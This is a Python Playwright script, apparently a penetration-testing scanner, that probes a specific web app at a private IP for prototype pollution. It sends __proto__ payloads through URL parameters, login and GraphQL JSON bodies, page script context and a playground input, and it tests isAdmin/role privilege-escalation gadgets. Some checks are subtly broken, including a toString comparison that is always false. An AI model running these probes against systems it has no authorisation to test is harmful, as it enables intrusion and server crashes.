#!/usr/bin/env python3
"""
Prototype Pollution Scanner
Target: SPA playground with user-controlled JS execution
Usage:
    # With session cookies:
    python3 proto_pollution_check.py --url https://172.32.129.13:8443 \
        --cookie "JSESSIONID=<value>" --cookie "clientId=<value>"

    # With credentials:
    python3 proto_pollution_check.py --url https://172.32.129.13:8443 \
        --username admin --password admin

    # Unauthenticated only:
    python3 proto_pollution_check.py --url https://172.32.129.13:8443
"""

import asyncio
import argparse
import json
import sys
import time
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, urlencode

from playwright.async_api import async_playwright, Page, BrowserContext

# ── Colours ────────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def ok(msg):   print(f"{GREEN}  [+]{RESET} {msg}")
def warn(msg): print(f"{YELLOW}  [!]{RESET} {msg}")
def fail(msg): print(f"{RED}  [✗]{RESET} {msg}")
def info(msg): print(f"{CYAN}  [*]{RESET} {msg}")
def hdr(msg):  print(f"\n{BOLD}{CYAN}{'─'*60}{RESET}\n{BOLD}  {msg}{RESET}\n{'─'*60}")


# ── Finding dataclass ───────────────────────────────────────────────────────
@dataclass
class Finding:
    id: str
    title: str
    severity: str          # CRITICAL / HIGH / MEDIUM / LOW / INFO
    vector: str
    payload: str
    result: str
    confirmed: bool
    notes: str = ""


# ── JS helpers injected into the page ──────────────────────────────────────
PROTO_BASELINE_JS = """
() => {
    const keys = Object.getOwnPropertyNames(Object.prototype);
    return {
        keys,
        count: keys.length,
        polluted: ({}).___pp_test !== undefined,
        window_is_global: window === globalThis,
        has_sandbox: (() => {
            try { return typeof document === 'undefined'; } catch(e) { return true; }
        })()
    };
}
"""

def make_poll_check_js(marker):
    """Returns JS that checks if Object.prototype has been polluted with marker."""
    return f"""
() => {{
    const probeA = ({{}})['___pp_{marker}'];
    const probeB = Object.getOwnPropertyDescriptor(Object.prototype, '___pp_{marker}');
    return {{
        polluted: probeA !== undefined,
        value: probeA,
        ownPropFound: probeB !== undefined
    }};
}}
"""

def make_pollute_js(marker, value):
    """Returns JS payloads for all three pollution vectors."""
    return {
        "direct":      f"Object.prototype['___pp_{marker}'] = '{value}';",
        "__proto__":   f"({{}}).__proto__['___pp_{marker}'] = '{value}';",
        "constructor": f"({{}}).constructor.prototype['___pp_{marker}'] = '{value}';",
    }

CLEANUP_JS = """
(marker) => {
    try { delete Object.prototype['___pp_' + marker]; } catch(e) {}
}
"""


# ── Core scanner ───────────────────────────────────────────────────────────
class ProtoPollutionScanner:

    PLAYGROUND_ROUTE = "/#/develop/playground/search"

    def __init__(self, base_url: str, cookies: list[dict], username: str, password: str):
        self.base_url    = base_url.rstrip("/")
        self.cookies     = cookies   # list of {"name":..,"value":..} dicts
        self.username    = username
        self.password    = password
        self.findings: list[Finding] = []
        self._fid = 0

    def _next_id(self):
        self._fid += 1
        return f"PP-{self._fid:03d}"

    def _add(self, **kw):
        f = Finding(**kw)
        self.findings.append(f)
        sev_color = {
            "CRITICAL": RED, "HIGH": RED,
            "MEDIUM": YELLOW, "LOW": CYAN, "INFO": ""
        }.get(f.severity, "")
        status = f"{GREEN}CONFIRMED{RESET}" if f.confirmed else f"{YELLOW}SAFE / NO-VULN{RESET}"
        print(f"  {'→':>3}  [{sev_color}{f.severity}{RESET}]  {f.title}  —  {status}")

    # ── Auth ───────────────────────────────────────────────────────────────
    async def _inject_cookies(self, ctx: BrowserContext):
        """Inject pre-captured session cookies."""
        if not self.cookies:
            return
        parsed = urlparse(self.base_url)
        domain = parsed.hostname
        await ctx.add_cookies([
            {
                "name":   c["name"],
                "value":  c["value"],
                "domain": domain,
                "path":   c.get("path", "/"),
                "secure": c.get("secure", False),
                "httpOnly": c.get("httpOnly", False),
                "sameSite": c.get("sameSite", "Lax").capitalize(),
            }
            for c in self.cookies
        ])

    async def _login(self, page: Page) -> bool:
        """Attempt form login, return True on success."""
        if not (self.username and self.password):
            return False
        info(f"Attempting login as '{self.username}'…")
        await page.goto(self.base_url, wait_until="networkidle")
        try:
            await page.fill('input[aria-label="username"]', self.username, timeout=5000)
            await page.fill('input[aria-label="password"]', self.password, timeout=5000)
            await page.click('button:has-text("Sign in")', timeout=5000)
            await page.wait_for_timeout(3000)
            if "login" not in page.url.lower():
                ok("Login succeeded")
                return True
            warn("Login failed (still on login page)")
        except Exception as e:
            warn(f"Login error: {e}")
        return False

    async def _ensure_authenticated(self, ctx: BrowserContext, page: Page) -> bool:
        """Return True if we have a valid authenticated session."""
        await self._inject_cookies(ctx)
        await page.goto(self.base_url + self.PLAYGROUND_ROUTE, wait_until="networkidle")
        await page.wait_for_timeout(2000)
        if "login" not in page.url.lower():
            ok("Session cookies valid — reached playground")
            return True
        # Cookies expired or absent, try form login
        logged_in = await self._login(page)
        if logged_in:
            await page.goto(self.base_url + self.PLAYGROUND_ROUTE, wait_until="networkidle")
            await page.wait_for_timeout(2000)
            return "login" not in page.url.lower()
        return False

    # ── Test helpers ───────────────────────────────────────────────────────
    async def _run_in_page_console(self, page: Page, js: str) -> dict:
        """Eval JS in page context, return result dict."""
        try:
            return await page.evaluate(js) or {}
        except Exception as e:
            return {"error": str(e)}

    async def _test_console_pollution(self, page: Page, vector_name: str,
                                       payload_js: str, marker: str, value: str) -> bool:
        """
        Inject pollution JS via console, check if Object.prototype was mutated.
        Returns True if vulnerable.
        """
        await page.evaluate(payload_js)
        result = await page.evaluate(make_poll_check_js(marker))
        polluted = result.get("polluted", False)
        # Cleanup regardless of outcome
        await page.evaluate(CLEANUP_JS, marker)
        return polluted

    async def _find_playground_input(self, page: Page) -> Optional[str]:
        """Return the best selector for the playground code input, or None."""
        candidates = [
            ".monaco-editor textarea",
            "textarea[aria-label*='search' i]",
            "textarea[aria-label*='query' i]",
            "textarea[placeholder*='search' i]",
            "textarea[placeholder*='query' i]",
            "[contenteditable='true']",
            "textarea",
            "input[type='text']",
        ]
        for sel in candidates:
            try:
                el = page.locator(sel).first
                if await el.is_visible(timeout=1000):
                    return sel
            except Exception:
                pass
        return None

    # ── Individual test suites ─────────────────────────────────────────────

    async def test_url_param_pollution(self, page: Page):
        """ISC-2/3/4: Test __proto__ and constructor[prototype] in URL query params."""
        hdr("TEST SUITE 1 — URL Parameter Prototype Pollution")

        vectors = [
            ("__proto__ query param",      f"{self.base_url}/?__proto__[___pp_url]=URL_POLLUTED"),
            ("constructor.prototype param",f"{self.base_url}/?constructor[prototype][___pp_url]=URL_POLLUTED"),
            ("hash fragment __proto__",    f"{self.base_url}{self.PLAYGROUND_ROUTE}?__proto__[___pp_url]=URL_POLLUTED"),
            ("hash fragment constructor",  f"{self.base_url}{self.PLAYGROUND_ROUTE}?constructor[prototype][___pp_url]=URL_POLLUTED"),
        ]

        for name, url in vectors:
            await page.goto(url, wait_until="networkidle")
            await page.wait_for_timeout(1500)
            result = await page.evaluate(make_poll_check_js("url"))
            polluted = result.get("polluted", False)
            await page.evaluate(CLEANUP_JS, "url")

            self._add(
                id=self._next_id(),
                title=f"URL param pollution — {name}",
                severity="HIGH" if polluted else "INFO",
                vector=f"GET {url}",
                payload=url,
                result=f"({{}}).___pp_url = {result.get('value')}",
                confirmed=polluted,
                notes="Object.prototype mutated via query string parsing" if polluted else "Clean"
            )

    async def test_json_body_pollution(self, page: Page):
        """ISC-11: POST endpoints with __proto__ in JSON body."""
        hdr("TEST SUITE 2 — JSON Body Prototype Pollution (Server-side)")

        endpoints = [
            f"{self.base_url}/prism/preauth/login",
            f"{self.base_url}/prism/graphql",
            f"{self.base_url}/callosum/v1/graphql",
            f"{self.base_url}/graphql",
        ]
        payloads = [
            # Classic pollution
            '{"__proto__":{"___pp_srv":"SERVER_POLLUTED"},"username":"x","password":"x","rememberMe":false}',
            # Constructor path
            '{"constructor":{"prototype":{"___pp_srv":"SERVER_POLLUTED"}},"username":"x","password":"x"}',
        ]

        for ep in endpoints:
            for payload in payloads:
                result = await page.evaluate(f"""
                async () => {{
                    try {{
                        const r = await fetch('{ep}', {{
                            method: 'POST',
                            headers: {{
                                'content-type': 'application/json',
                                'x-requested-by': 'ThoughtSpot',
                                'x-csrf-token': ''
                            }},
                            body: {json.dumps(payload)}
                        }});
                        return {{ status: r.status, ok: r.ok }};
                    }} catch(e) {{
                        return {{ error: e.message }};
                    }}
                }}
                """)
                status = result.get("status", 0)
                # 500 = server-side crash (likely merge of __proto__)
                # 400 = rejected/sanitised
                # 401 = accepted structure but auth failed (ignored, not vulnerable)
                crashed = status == 500
                blocked = status == 400

                label = "Crash (500)" if crashed else ("Blocked (400)" if blocked else f"Ignored ({status})")
                self._add(
                    id=self._next_id(),
                    title=f"JSON __proto__ body — {ep.split('/')[-1]}",
                    severity="CRITICAL" if crashed else ("MEDIUM" if blocked else "INFO"),
                    vector=f"POST {ep}",
                    payload=payload[:80] + "…",
                    result=label,
                    confirmed=crashed,
                    notes="Server returned 500 — likely crashed on __proto__ merge" if crashed else
                          "400 = payload sanitised" if blocked else "Ignored at application level"
                )

    async def test_script_context_pollution(self, page: Page, authenticated: bool):
        """ISC-5/6/7/8/9: Direct JS prototype pollution in page context."""
        hdr("TEST SUITE 3 — Script Execution Context Pollution")

        # Baseline
        baseline = await page.evaluate(PROTO_BASELINE_JS)
        info(f"Baseline Object.prototype key count: {baseline.get('count')}")
        info(f"window === globalThis: {baseline.get('window_is_global')}")
        info(f"Sandbox detected: {baseline.get('has_sandbox')}")

        if baseline.get("window_is_global"):
            warn("NO SANDBOX — scripts execute in full browser context (window === globalThis)")
        if baseline.get("has_sandbox"):
            ok("Sandbox active — document is inaccessible from script context")

        vectors = make_pollute_js("ctx", "CTX_POLLUTED")

        for vec_name, payload_js in vectors.items():
            marker = f"ctx_{vec_name.replace('__','').replace('.','_')}"
            specific_payload = f"Object.prototype['___pp_{marker}'] = 'CTX_POLLUTED';" \
                if vec_name == "direct" else \
                f"({{}}){'' if vec_name == '__proto__' else '.constructor'}" \
                f"{'.__proto__' if vec_name == '__proto__' else '.prototype'}" \
                f"['___pp_{marker}'] = 'CTX_POLLUTED';"

            # Use the real payload per vector
            js_map = {
                "direct":      f"Object.prototype['___pp_{marker}'] = 'CTX_POLLUTED';",
                "__proto__":   f"({{}}).__proto__['___pp_{marker}'] = 'CTX_POLLUTED';",
                "constructor": f"({{}}).constructor.prototype['___pp_{marker}'] = 'CTX_POLLUTED';",
            }
            polluted = await self._test_console_pollution(
                page, vec_name, js_map[vec_name], marker, "CTX_POLLUTED"
            )

            self._add(
                id=self._next_id(),
                title=f"Object.prototype mutation via '{vec_name}' vector",
                severity="CRITICAL" if polluted else "INFO",
                vector=f"JS execution in {'authenticated playground' if authenticated else 'login page'} context",
                payload=js_map[vec_name],
                result="Object.prototype permanently mutated — all objects inherit polluted value" if polluted else "Pollution failed",
                confirmed=polluted,
                notes="No Object.freeze(Object.prototype) in place" if polluted else ""
            )

        # Persistence test — set one, check after a tick
        await page.evaluate("Object.prototype['___pp_persist'] = 'PERSIST_CHECK';")
        await page.wait_for_timeout(500)
        check = await page.evaluate("() => ({}).___pp_persist")
        persists = check == "PERSIST_CHECK"
        await page.evaluate(CLEANUP_JS, "persist")

        self._add(
            id=self._next_id(),
            title="Pollution persistence — survives event loop tick",
            severity="HIGH" if persists else "INFO",
            vector="Object.prototype assignment",
            payload="Object.prototype['___pp_persist'] = 'PERSIST_CHECK'",
            result="Persists across async ticks — no cleanup mechanism" if persists else "Cleaned up",
            confirmed=persists
        )

        # Privilege escalation gadget
        await page.evaluate("Object.prototype['___pp_isAdmin'] = true;")
        await page.evaluate("Object.prototype['___pp_role'] = 'admin';")
        gadget_check = await page.evaluate("""
            () => ({
                isAdmin: ({}).___pp_isAdmin,
                role:    ({}).___pp_role,
                affects_all_objects: [1,2,3].map(x => ({})).every(o => o.___pp_isAdmin === true)
            })
        """)
        await page.evaluate(CLEANUP_JS, "isAdmin")
        await page.evaluate(CLEANUP_JS, "role")

        self._add(
            id=self._next_id(),
            title="Privilege escalation gadget — isAdmin/role on Object.prototype",
            severity="CRITICAL" if gadget_check.get("isAdmin") else "INFO",
            vector="Object.prototype.isAdmin = true",
            payload="Object.prototype['___pp_isAdmin']=true; Object.prototype['___pp_role']='admin'",
            result=f"isAdmin={gadget_check.get('isAdmin')}, role={gadget_check.get('role')}, affects_all={gadget_check.get('affects_all_objects')}",
            confirmed=bool(gadget_check.get("isAdmin")),
            notes="If app checks obj.isAdmin without hasOwnProperty(), this grants privilege"
        )

    async def test_playground_input_pollution(self, page: Page):
        """ISC-5 via actual playground input field — type and submit payloads."""
        hdr("TEST SUITE 4 — Playground Input Field Execution")

        selector = await self._find_playground_input(page)
        if not selector:
            warn("No playground input field found — skip input-based tests")
            self._add(
                id=self._next_id(),
                title="Playground input field — not reachable",
                severity="INFO",
                vector="playground UI",
                payload="N/A",
                result="Input field not found (auth required or different route)",
                confirmed=False,
                notes="Re-run with valid session cookies targeting #/develop/playground/search"
            )
            return

        ok(f"Playground input found: {selector}")

        run_buttons = [
            'button:has-text("Run")',
            'button:has-text("Execute")',
            'button:has-text("Search")',
            '[aria-label*="run" i]',
            '[data-testid*="run" i]',
        ]

        async def find_run_button():
            for sel in run_buttons:
                try:
                    btn = page.locator(sel).first
                    if await btn.is_visible(timeout=1000):
                        return sel
                except Exception:
                    pass
            return None

        run_btn = await find_run_button()

        payloads = [
            ("Direct Object.prototype",    "Object.prototype['___pp_input_A'] = 'INPUT_POLLUTED'"),
            ("__proto__ path",             "({}).__proto__['___pp_input_B'] = 'INPUT_POLLUTED'"),
            ("constructor.prototype path", "({}).constructor.prototype['___pp_input_C'] = 'INPUT_POLLUTED'"),
            ("toJSON gadget",              "Object.prototype.toJSON = function(){ return {polluted:true}; }"),
            ("toString gadget",            "Object.prototype.toString = function(){ return 'POLLUTED'; }"),
        ]

        for name, payload in payloads:
            # Clear field and type payload
            try:
                await page.click(selector)
                await page.keyboard.press("Control+A")
                await page.keyboard.press("Backspace")
                await page.type(selector, payload, delay=30)
            except Exception as e:
                warn(f"  Could not type into input: {e}")
                continue

            # Run it
            if run_btn:
                try:
                    await page.click(run_btn)
                    await page.wait_for_timeout(1500)
                except Exception:
                    await page.keyboard.press("Control+Enter")
                    await page.wait_for_timeout(1500)

            # Check if prototype was polluted in the main context
            marker = name.lower().replace(" ", "_").replace(".", "").replace("()", "")
            check = await page.evaluate("""
                () => ({
                    A: ({}).___pp_input_A,
                    B: ({}).___pp_input_B,
                    C: ({}).___pp_input_C,
                    toJSON_overwritten: Object.prototype.toJSON !== undefined,
                    toString_overwritten: Object.prototype.toString !== Object.prototype.toString,
                })
            """)
            polluted = any([
                check.get("A"), check.get("B"), check.get("C"),
                check.get("toJSON_overwritten"), check.get("toString_overwritten")
            ])

            # Cleanup
            for k in ["input_A", "input_B", "input_C"]:
                await page.evaluate(CLEANUP_JS, k)
            try:
                await page.evaluate("delete Object.prototype.toJSON;")
                await page.evaluate("delete Object.prototype.toString;")
            except Exception:
                pass

            self._add(
                id=self._next_id(),
                title=f"Playground input pollution — {name}",
                severity="CRITICAL" if polluted else "INFO",
                vector=f"Type payload into {selector}, click Run",
                payload=payload,
                result=f"Main context Object.prototype polluted: {polluted} | details={check}",
                confirmed=polluted,
                notes="Script executed in same context as app — no sandbox" if polluted else
                      "Isolated context — pollution did not reach main Object.prototype"
            )

    async def test_graphql_introspection(self, page: Page):
        """ISC-13: GraphQL introspection + __proto__ injection via query."""
        hdr("TEST SUITE 5 — GraphQL Introspection + Body Pollution")

        gql_endpoints = ["/prism/graphql", "/graphql", "/callosum/v1/graphql"]

        for ep in gql_endpoints:
            url = self.base_url + ep
            # Introspection
            result = await page.evaluate(f"""
            async () => {{
                try {{
                    const r = await fetch('{url}', {{
                        method: 'POST',
                        headers: {{
                            'content-type': 'application/json',
                            'x-requested-by': 'ThoughtSpot'
                        }},
                        body: JSON.stringify({{query: '{{__schema{{types{{name}}}}}}'}}),
                    }});
                    const text = await r.text();
                    return {{ status: r.status, body: text.substring(0, 300) }};
                }} catch(e) {{ return {{ error: e.message }}; }}
            }}
            """)

            status = result.get("status", 0)
            body   = result.get("body", "")
            introspection_open = status == 200 and "__schema" in body

            self._add(
                id=self._next_id(),
                title=f"GraphQL introspection — {ep}",
                severity="HIGH" if introspection_open else "INFO",
                vector=f"POST {url}",
                payload='{"query":"{__schema{types{name}}}"}',
                result=f"HTTP {status} | introspection={'OPEN' if introspection_open else 'BLOCKED'}",
                confirmed=introspection_open,
                notes="GraphQL schema fully exposed to any user" if introspection_open else ""
            )

            # __proto__ via GraphQL variables
            result2 = await page.evaluate(f"""
            async () => {{
                try {{
                    const r = await fetch('{url}', {{
                        method: 'POST',
                        headers: {{
                            'content-type': 'application/json',
                            'x-requested-by': 'ThoughtSpot'
                        }},
                        body: JSON.stringify({{
                            query: 'query Test($v: String) {{ __typename }}',
                            variables: {{"__proto__": {{"polluted": "GQL_VAR_POLLUTED"}}}}
                        }}),
                    }});
                    return {{ status: r.status }};
                }} catch(e) {{ return {{ error: e.message }}; }}
            }}
            """)
            crashed = result2.get("status") == 500
            self._add(
                id=self._next_id(),
                title=f"GraphQL variables __proto__ pollution — {ep}",
                severity="CRITICAL" if crashed else "INFO",
                vector=f"POST {url} — variables.__proto__",
                payload='variables: {"__proto__": {"polluted": "GQL_VAR_POLLUTED"}}',
                result=f"HTTP {result2.get('status', '?')}",
                confirmed=crashed,
                notes="500 = server crashed on __proto__ in GQL variables" if crashed else "Ignored"
            )

    # ── Report ─────────────────────────────────────────────────────────────
    def print_report(self):
        hdr("FINDINGS REPORT")
        confirmed = [f for f in self.findings if f.confirmed]
        total     = len(self.findings)

        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        confirmed.sort(key=lambda f: sev_order.get(f.severity, 99))

        if not confirmed:
            ok("No prototype pollution vulnerabilities confirmed.")
        else:
            fail(f"{len(confirmed)} vulnerability/vulnerabilities confirmed out of {total} tests\n")
            for f in confirmed:
                sev_color = RED if f.severity in ("CRITICAL", "HIGH") else YELLOW
                print(f"  {BOLD}{f.id}{RESET}  [{sev_color}{f.severity}{RESET}]  {f.title}")
                print(f"       Vector  : {f.vector}")
                print(f"       Payload : {f.payload}")
                print(f"       Result  : {f.result}")
                if f.notes:
                    print(f"       Notes   : {f.notes}")
                print()

        # Safe
        safe = [f for f in self.findings if not f.confirmed]
        if safe:
            print(f"  {GREEN}Safe / Not Vulnerable ({len(safe)} tests):{RESET}")
            for f in safe:
                print(f"    {CYAN}·{RESET} {f.id}  {f.title}")

        # Summary
        print(f"\n  {'─'*50}")
        print(f"  Total tests : {total}")
        print(f"  Confirmed   : {RED}{len(confirmed)}{RESET}")
        print(f"  Safe        : {GREEN}{len(safe)}{RESET}")

    def save_json(self, path: str):
        data = [
            {
                "id": f.id, "title": f.title, "severity": f.severity,
                "vector": f.vector, "payload": f.payload,
                "result": f.result, "confirmed": f.confirmed, "notes": f.notes
            }
            for f in self.findings
        ]
        with open(path, "w") as fh:
            json.dump(data, fh, indent=2)
        info(f"JSON report saved → {path}")


# ── Main ────────────────────────────────────────────────────────────────────
async def main():
    parser = argparse.ArgumentParser(description="Prototype Pollution Scanner")
    parser.add_argument("--url",      default="https://172.32.129.13:8443",
                        help="Base URL of the target SPA")
    parser.add_argument("--cookie",   action="append", default=[],
                        help="Cookie as name=value (repeat for multiple)")
    parser.add_argument("--cookie-json", default=None,
                        help="Path to exported cookies JSON file")
    parser.add_argument("--username", default="", help="Login username")
    parser.add_argument("--password", default="", help="Login password")
    parser.add_argument("--out",      default="proto_pollution_results.json",
                        help="Output JSON report path")
    parser.add_argument("--headed",   action="store_true",
                        help="Show browser window (default: headless)")
    args = parser.parse_args()

    # Parse cookies
    cookies: list[dict] = []
    if args.cookie_json:
        with open(args.cookie_json) as fh:
            cookies = json.load(fh)           # accepts Firefox/Chrome export format
    for raw in args.cookie:
        if "=" in raw:
            name, _, value = raw.partition("=")
            cookies.append({"name": name.strip(), "value": value.strip()})

    print(f"\n{BOLD}{CYAN}  Prototype Pollution Scanner{RESET}")
    print(f"  Target  : {args.url}")
    print(f"  Cookies : {len(cookies)} provided")
    print(f"  Auth    : {'credentials' if args.username else 'cookies only' if cookies else 'none (unauthenticated)'}")
    print()

    scanner = ProtoPollutionScanner(args.url, cookies, args.username, args.password)

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(
            headless=not args.headed,
            args=[
                "--ignore-certificate-errors",
                "--allow-insecure-localhost",
                "--disable-web-security",          # needed for cross-origin fetch tests
            ]
        )
        ctx  = await browser.new_context(ignore_https_errors=True)
        page = await ctx.new_page()

        # Suppress console noise
        page.on("console", lambda m: None)

        # ── Suite 1: URL param pollution (no auth needed) ──────────────────
        await page.goto(args.url, wait_until="networkidle")
        await scanner.test_url_param_pollution(page)

        # ── Suite 2: JSON body pollution (no auth needed) ──────────────────
        await page.goto(args.url, wait_until="networkidle")
        await scanner.test_json_body_pollution(page)

        # ── Suite 3: Script context pollution ──────────────────────────────
        # Runs in whatever page context we have (even login page = same SPA JS)
        await page.goto(args.url, wait_until="networkidle")
        await page.wait_for_timeout(2000)
        await scanner.test_script_context_pollution(page, authenticated=False)

        # ── Authenticate ───────────────────────────────────────────────────
        hdr("AUTHENTICATION")
        authenticated = await scanner._ensure_authenticated(ctx, page)
        if authenticated:
            ok("Authenticated — running playground-specific tests")
        else:
            warn("Not authenticated — playground input tests will be skipped")

        # ── Suite 4: Playground input field ────────────────────────────────
        await scanner.test_playground_input_pollution(page)

        # ── Suite 5: GraphQL ───────────────────────────────────────────────
        await scanner.test_graphql_introspection(page)

        await browser.close()

    scanner.print_report()
    scanner.save_json(args.out)


if __name__ == "__main__":
    asyncio.run(main())
